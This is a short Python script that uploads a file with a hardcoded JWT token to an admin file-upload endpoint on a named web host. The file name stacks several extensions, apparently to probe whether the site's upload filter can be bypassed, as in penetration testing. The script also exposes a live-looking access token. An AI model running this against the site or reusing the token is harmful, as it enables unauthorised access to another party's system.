#!/usr/bin/python

import requests

def upImg():
    url = "http://web-gateway.beehivescm.com/fw-open-admin/file/upload"
    header = {}
    header['token'] = "eyJhbGciOiJIUzUxMiJ9.eyJqdGkiOiIyMTcwMDcwIiwiaWF0IjoxNTM2ODAwNDYwLCJidXNpbmVzc1N5c3RlbSI6IkJPU1MiLCJzb3VyY2VUeXBlIjoiUEMiLCJ0b2tlbkV4cGlyZVRpbWUiOjg2NDAwfQ.f6ctaPtxzAFPjfh_-tVl3AA7sMcaiMjzB4zqz_3YT9XQ04h4JdlzAiWrifOm9Fdo6FY5gpzROLxKbMei91R2Ow"
    with open(r'/root/Desktop/test.jpg\.html\.py.html','rb') as f:
        ff = {'file':f.read()}
    r = requests.post(url, headers=header, files=ff)
    print r.content

upImg()
